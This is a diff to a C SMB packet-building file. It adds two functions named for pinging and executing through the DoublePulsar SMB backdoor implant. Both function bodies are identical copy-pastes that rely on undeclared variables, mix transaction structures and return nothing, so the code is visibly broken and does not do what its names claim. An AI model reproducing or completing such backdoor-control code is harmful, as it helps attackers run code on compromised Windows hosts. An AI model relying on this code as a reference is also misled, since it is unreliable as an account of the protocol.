@@ -203,6 +203,80 @@ int BuildTreeConnectAndXStub(char *destination,char *password, char *resource, c
 //SMB Negotiation
 char *AddDialect(char *data, char *name, uint8 type, int *PacketSize);
 
+smheader *buildDoublePulsarPingPacket()
+{
+	TransRequest=(SMB_COM_TRANSACTION_STRUCT *)malloc(sizeof(SMB_COM_TRANSACTION_STRUCT));
+		memset((char*)TransRequest,'\0',sizeof(SMB_COM_TRANSACTION_STRUCT));
+		NewSmbPacket->TreeId=((smheader *)PreviousSmbMessage)->TreeId;
+		TransRequest->WordCount=16;
+		TransRequest->TotalParameterCount=0 ;
+		TransRequest->MaxDataCount=1024;
+		TransRequest->MaxParameterCount=0;
+		TransRequest->MaxSetupCount=0;
+		TransRequest->reserved=0;
+		TransRequest->flags=0;
+		TransRequest->timeout=0x00000000;
+		TransRequest->reserved2=0;
+		TransRequest->ParameterCount=0;
+		TransRequest->ParameterOffset=84;
+		TransRequest->DataOffset=84;
+		TransRequest->SetupCount=2; 
+		TransRequest->reserved3=0;
+
+		TransRequest->Function=0x33;
+		TransRequest->padding=0;
+		TransRequest->padding2=0;
+
+		NewSmbPacket->SmbMessageLength=(uint16)SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) +sizeof(SMB_COM_TRANS2_STRUCT) + sizeof(parameters) + DataSize -4);
+		
+		TransRequest->TotalDataCount=(uint16)sizeof(parameters) + DataSize;
+
+		TransRequest->DataCount=TransRequest->TotalDataCount;				
+		TransRequest->ByteCount=TransRequest->TotalDataCount + 12; 
+
+		memcpy(NewSmbPacket->buffer,(char*)TransRequest,sizeof(SMB_COM_TRANSACTION_STRUCT));
+		memcpy(NewSmbPacket->buffer+sizeof(SMB_COM_TRANSACTION_STRUCT),(char*)dcerpc,sizeof(DceRpcRequest));
+        	memcpy(NewSmbPacket->buffer+sizeof(SMB_COM_TRANSACTION_STRUCT) +sizeof(DceRpcRequest),(char*)data,DataSize);
+        	free(TransRequest);
+}
+
+smheader *buildDoublePulsarExecPacket()
+{
+	TransRequest=(SMB_COM_TRANSACTION_STRUCT *)malloc(sizeof(SMB_COM_TRANSACTION_STRUCT));
+		memset((char*)TransRequest,'\0',sizeof(SMB_COM_TRANSACTION_STRUCT));
+		NewSmbPacket->TreeId=((smheader *)PreviousSmbMessage)->TreeId;
+		TransRequest->WordCount=16;
+		TransRequest->TotalParameterCount=0 ;
+		TransRequest->MaxDataCount=1024;
+		TransRequest->MaxParameterCount=0;
+		TransRequest->MaxSetupCount=0;
+		TransRequest->reserved=0;
+		TransRequest->flags=0;
+		TransRequest->timeout=0x00000000;
+		TransRequest->reserved2=0;
+		TransRequest->ParameterCount=0;
+		TransRequest->ParameterOffset=84;
+		TransRequest->DataOffset=84;
+		TransRequest->SetupCount=2; 
+		TransRequest->reserved3=0;
+
+		TransRequest->Function=0x33;
+		TransRequest->padding=0;
+		TransRequest->padding2=0;
+
+		NewSmbPacket->SmbMessageLength=(uint16)SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) +sizeof(SMB_COM_TRANS2_STRUCT) + sizeof(parameters) + DataSize -4);
+		
+		TransRequest->TotalDataCount=(uint16)sizeof(parameters) + DataSize;
+
+		TransRequest->DataCount=TransRequest->TotalDataCount;				
+		TransRequest->ByteCount=TransRequest->TotalDataCount + 12; 
+
+		memcpy(NewSmbPacket->buffer,(char*)TransRequest,sizeof(SMB_COM_TRANSACTION_STRUCT));
+		memcpy(NewSmbPacket->buffer+sizeof(SMB_COM_TRANSACTION_STRUCT),(char*)dcerpc,sizeof(DceRpcRequest));
+        	memcpy(NewSmbPacket->buffer+sizeof(SMB_COM_TRANSACTION_STRUCT) +sizeof(DceRpcRequest),(char*)data,DataSize);
+        	free(TransRequest);
+}
+
 
 smheader *BuildSmbPacket1(void)
 {
